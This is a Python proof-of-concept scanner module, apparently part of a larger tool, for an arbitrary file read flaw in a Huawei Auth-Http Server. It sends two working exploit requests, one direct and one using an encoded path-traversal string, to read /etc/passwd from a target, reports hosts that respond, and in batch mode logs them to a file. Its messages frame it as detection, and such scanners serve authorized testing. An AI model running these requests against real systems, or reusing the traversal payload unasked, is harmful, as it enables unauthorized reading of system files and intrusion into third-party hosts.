import requests,re,urllib3
# server=Huawei Auth-Http Server 1.0
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class HuaWeiAuth_Http:
	def scan(self,baseurl):
		url=baseurl+f"/umweb/passwd"
		headers={'User-Agent': self.headers}
		try:
			response=requests.get(url,headers=headers,timeout=8,verify=self.ssl,proxies=self.proxy)
			if re.search("root:.*:0",response.text):
				OutPrintInfoSuc("HuaWei", f'存在HuaWei任意文件读取 {url}')
			else:
				if not self.batch:
					OutPrintInfo("HuaWei", '不存在HuaWei任意文件读取')
		except Exception:
			if not self.batch:
				OutPrintInfo("HuaWei", '目标请求出错')


	def scan2(self,baseurl):
			url=baseurl+f"/umweb/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"
			headers = {'User-Agent': self.headers}
			try:
				response=requests.get(url,timeout=8,verify=self.ssl,proxies=self.proxy,headers=headers)
				if re.search("root:.*:0",response.text):
					OutPrintInfoSuc("HuaWei", f'存在HuaWei任意文件读取 {url}')

					if self.batch:
						OutPutFile("huawei_auth_http_read_file.txt",f'存在HuaWei任意文件读取 {url}')
				else:
					if not self.batch:
						OutPrintInfo("HuaWei", '不存在HuaWei任意文件读取')
			except Exception:
				if not self.batch:
					OutPrintInfo("HuaWei", '目标请求出错')


	def main(self, target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		if not self.batch:
			req = ReqSet(proxy=proxy)
			self.proxy = req["proxy"]

		else:
			self.proxy = {"http": proxy, "https": proxy}
		if not self.batch:
			OutPrintInfo("HuaWei", '开始执行HuaWei任意文件读取检测...')
			OutPrintInfo("HuaWei", '开始执行HuaWei任意文件读取POC-1...')
		self.scan(url)
		if not self.batch:
			OutPrintInfo("HuaWei", '开始执行HuaWei任意文件读取POC-2...')
		self.scan2(url)
		if not self.batch:
			OutPrintInfo("HuaWei", 'HuaWei任意文件读取检测结束')